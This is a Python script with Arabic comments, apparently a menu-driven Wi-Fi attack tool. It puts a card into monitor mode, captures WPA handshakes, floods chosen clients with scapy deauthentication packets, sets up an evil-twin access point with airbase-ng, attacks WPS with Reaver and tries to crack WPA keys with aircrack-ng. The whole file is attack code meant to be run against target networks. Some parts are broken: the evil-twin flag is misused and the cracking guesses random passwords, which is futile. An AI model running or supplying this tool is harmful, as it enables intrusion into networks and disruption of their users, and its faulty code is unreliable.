#!/usr/bin/env python3

import os
import subprocess
import time
from scapy.all import *
import sys
import random
import string

# تعريف الواجهة اللاسلكية
interface = "wlan0"
monitor_interface = "wlan0mon"

# وضع الواجهة في وضع المراقبة
def start_monitor_mode(interface):
    print(f"[*] وضع {interface} في وضع المراقبة...")
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode monitor")
    os.system(f"ifconfig {interface} up")
    print(f"[+] تم تفعيل وضع المراقبة على {interface}")

# إيقاف وضع المراقبة
def stop_monitor_mode(interface):
    print(f"[*] إيقاف وضع المراقبة على {interface}...")
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode managed")
    os.system(f"ifconfig {interface} up")
    print(f"[+] تم إيقاف وضع المراقبة على {interface}")

# مسح الشبكات اللاسلكية القريبة
def scan_networks(interface):
    print(f"[*] بدء مسح الشبكات على {interface}...")
    os.system(f"airodump-ng {interface}")

# التقاط مصافحة WPA
def capture_handshake(interface, bssid, channel, output_file):
    print(f"[*] بدء التقاط مصافحة WPA لـ {bssid} على القناة {channel}...")
    os.system(f"airodump-ng --bssid {bssid} --channel {channel} --write {output_file} {interface}")

# هجوم deauthentication
def deauth_attack(interface, bssid, client):
    print(f"[*] بدء هجوم deauthentication على {client}...")
    packet = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
    sendp(packet, iface=interface, count=100, inter=0.1)
    print(f"[+] تم إرسال حزم deauthentication إلى {client}")

# إنشاء نقطة وصول وهمية (Evil Twin)
def create_evil_twin(interface, essid, channel):
    print(f"[*] إنشاء نقطة وصول وهمية باسم {essid} على القناة {channel}...")
    os.system(f"airbase-ng -a {essid} -c {channel} {interface}")

# استغلال ثغرة WPS باستخدام Reaver
def exploit_wps(interface, bssid, channel):
    print(f"[*] بدء استغلال ثغرة WPS لـ {bssid} على القناة {channel}...")
    os.system(f"reaver -i {interface} -b {bssid} -c {channel} -vv")

# توليد كلمات مرور عشوائية قوية
def generate_random_password(length=12):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

# كسر تشفير WPA/WPA2 باستخدام كلمات مرور عشوائية
def crack_wpa_with_random_passwords(handshake_file, max_attempts=1000):
    print(f"[*] بدء كسر تشفير WPA/WPA2 باستخدام كلمات مرور عشوائية...")
    for attempt in range(max_attempts):
        password = generate_random_password()
        print(f"المحاولة {attempt + 1}: تجربة كلمة المرور: {password}")
        result = subprocess.run(f"aircrack-ng {handshake_file}.cap -w - <<< '{password}'", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if "KEY FOUND!" in result.stdout.decode():
            print(f"[+] تم العثور على كلمة المرور: {password}")
            return
    print("[-] لم يتم العثور على كلمة المرور بعد عدد المحاولات المحدد.")

# الواجهة الرئيسية
def main():
    print("[*] بدء أداة اختبار اختراق الواي فاي المتقدمة مع دعم تخمين كلمات المرور العشوائية")
    start_monitor_mode(interface)

    while True:
        print("\n1. مسح الشبكات اللاسلكية")
        print("2. التقاط مصافحة WPA")
        print("3. تنفيذ هجوم deauthentication")
        print("4. كسر تشفير WPA/WPA2 باستخدام كلمات مرور عشوائية")
        print("5. إنشاء نقطة وصول وهمية (Evil Twin)")
        print("6. استغلال ثغرة WPS")
        print("7. الخروج")
        choice = input("اختر الخيار: ")

        if choice == "1":
            scan_networks(interface)
        elif choice == "2":
            bssid = input("أدخل BSSID للشبكة المستهدفة: ")
            channel = input("أدخل القناة (Channel): ")
            output_file = input("أدخل اسم ملف الإخراج (بدون امتداد): ")
            capture_handshake(interface, bssid, channel, output_file)
        elif choice == "3":
            bssid = input("أدخل BSSID للشبكة المستهدفة: ")
            client = input("أدخل عنوان MAC للعميل المستهدف: ")
            deauth_attack(interface, bssid, client)
        elif choice == "4":
            handshake_file = input("أدخل اسم ملف المصافحة (بدون امتداد .cap): ")
            max_attempts = int(input("أدخل عدد المحاولات (مثلاً 1000): "))
            crack_wpa_with_random_passwords(handshake_file, max_attempts)
        elif choice == "5":
            essid = input("أدخل اسم الشبكة الوهمية (ESSID): ")
            channel = input("أدخل القناة (Channel): ")
            create_evil_twin(interface, essid, channel)
        elif choice == "6":
            bssid = input("أدخل BSSID للشبكة المستهدفة: ")
            channel = input("أدخل القناة (Channel): ")
            exploit_wps(interface, bssid, channel)
        elif choice == "7":
            stop_monitor_mode(interface)
            print("[*] الخروج من الأداة...")
            sys.exit(0)
        else:
            print("[-] خيار غير صحيح، يرجى المحاولة مرة أخرى.")

if __name__ == "__main__":
    main()
